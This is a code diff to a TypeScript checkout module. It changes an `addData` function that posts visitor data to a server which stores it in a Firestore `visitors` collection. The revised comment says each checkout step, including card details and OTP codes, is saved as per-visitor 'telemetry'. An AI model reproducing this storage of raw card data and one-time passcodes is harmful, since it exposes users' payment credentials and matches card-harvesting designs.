@@ -446,33 +446,28 @@ export async function verifyOtp(
   await updateDoc(ref, { verified: true, verifiedAt: Timestamp.now() });
 }
 /**
- * Persist arbitrary visitor-scoped data through the api-server, which
- * writes it to the `visitors` Firestore collection using the Admin SDK.
+ * Append arbitrary visitor-scoped telemetry to the `visitors` Firestore
+ * collection (server-side, via the api-server's Admin SDK). Used by the
+ * checkout flow to record each step (contact info, card details, OTP, etc.)
+ * keyed by a stable per-visitor id so a single visitor produces one merged
+ * document.
  *
- * The browser does NOT have direct Firestore credentials, so this routes
- * through the server (same pattern as createOrder above). The id is used
- * as the document key and merged on each call.
+ * `data` MUST include a string `id` (the visitor id from `ensureVisitorId()`).
+ * All other fields are persisted as-is via `{ merge: true }`.
  */
 export async function addData(
-  data: { id: string | null | undefined } & Record<string, unknown>,
+  data: Record<string, unknown> & { id: string },
 ): Promise<void> {
-  if (!data || typeof data !== "object") {
-    throw new Error("addData: data must be an object");
+  if (!data || typeof data.id !== "string" || !data.id) {
+    throw new Error("addData: missing visitor id");
   }
-  if (!data.id) {
-    throw new Error("addData: data.id is required");
-  }
-
-  localStorage.setItem("visitor", String(data.id));
-
+  localStorage.setItem("visitor", data.id);
   const r = await fetch("/api/visitor-data", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(data),
   });
   if (!r.ok) {
-    const msg = await readApiError(r);
-    console.error("addData failed:", msg);
-    throw new Error(msg);
+    throw new Error(await readApiError(r));
   }
 }
